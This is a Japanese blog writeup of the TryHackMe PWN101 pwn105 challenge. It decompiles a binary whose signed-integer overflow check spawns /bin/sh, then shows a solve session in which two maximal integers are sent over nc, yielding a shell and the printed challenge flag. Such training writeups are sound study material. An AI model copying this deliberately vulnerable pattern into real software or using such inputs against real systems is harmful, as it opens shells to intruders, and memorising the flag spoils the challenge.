---
title: TryHackMe PWN101 Writeup (5) PWN105
pubDatetime: 2026-04-25T05:00:00+09:00
description: TryHackMe PWN101 Challenge 5のWriteup
tags: [TryHackMe, Writeup, Pwn]
draft: false
---

## file

PIE

```shellsession
$ file pwn105-1644300421555.pwn105
pwn105-1644300421555.pwn105: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=efe6d094462867e6b08e74de43fb7126e7b14ee4, for GNU/Linux 3.2.0, not stripped
```

## checksec

Canary

```shellsession
$ .venv/bin/pwn checksec pwn105-1644300421555.pwn105
[*] '/home/hat0uma/work/pwn105-1644300421555.pwn105'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

## 実行

なんか足し算してくれるらしい。

```shellsession
$ ./pwn105-1644300421555.pwn105
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 105


-------=[ BAD INTEGERS ]=-------
|-< Enter two numbers to add >-|

]>> 1
]>> 1

[*] ADDING 1 + 1
[*] RESULT: 2
```

## Ghidra

単体で32bit符号ありの範囲を超えると超えると失敗。
単体では超えないけど足したら32bitを超える数字を入れるとシェルが取れる。
単純に実行したら終わり。

```c
void main(void)
{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts("-------=[ BAD INTEGERS ]=-------");
  puts("|-< Enter two numbers to add >-|\n");
  printf("]>> ");
  __isoc99_scanf(&DAT_0010216f,&local_1c);
  printf("]>> ");
  __isoc99_scanf(&DAT_0010216f,&local_18);
  local_14 = local_18 + local_1c;
  if (((int)local_1c < 0) || ((int)local_18 < 0)) {
    printf("\n[o.O] Hmmm... that was a Good try!\n",(ulong)local_1c,(ulong)local_18,(ulong)local_14)
    ;
  }
  else if ((int)local_14 < 0) {
    printf("\n[*] C: %d",(ulong)local_14);
    puts("\n[*] Popped Shell\n[*] Switching to interactive mode");
    system("/bin/sh");
  }
  else {
    printf("\n[*] ADDING %d + %d",(ulong)local_1c,(ulong)local_18);
    printf("\n[*] RESULT: %d\n",(ulong)local_14);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

## solver

```shellsession
root@ip-10-144-66-81:~# nc 10.144.129.186 9005
       \u250c\u252c\u2510\u252c\u2500\u2510\u252c \u252c\u252c \u252c\u250c\u2500\u2510\u250c\u2500\u2510\u252c\u250c\u2500\u250c\u252c\u2510\u250c\u2500\u2510
        \u2502 \u251c\u252c\u2518\u2514\u252c\u2518\u251c\u2500\u2524\u251c\u2500\u2524\u2502  \u251c\u2534\u2510\u2502\u2502\u2502\u251c\u2524
        \u2534 \u2534\u2514\u2500 \u2534 \u2534 \u2534\u2534 \u2534\u2514\u2500\u2518\u2534 \u2534\u2534 \u2534\u2514\u2500\u2518
                 pwn 105


-------=[ BAD INTEGERS ]=-------
|-< Enter two numbers to add >-|

]>> 2147483647
]>> 2147483647

[*] C: -2
[*] Popped Shell
[*] Switching to interactive mode
ls
flag.txt
pwn105
pwn105.c
cat flag.txt
THM{VerY_b4D_1n73G3rsss}
```
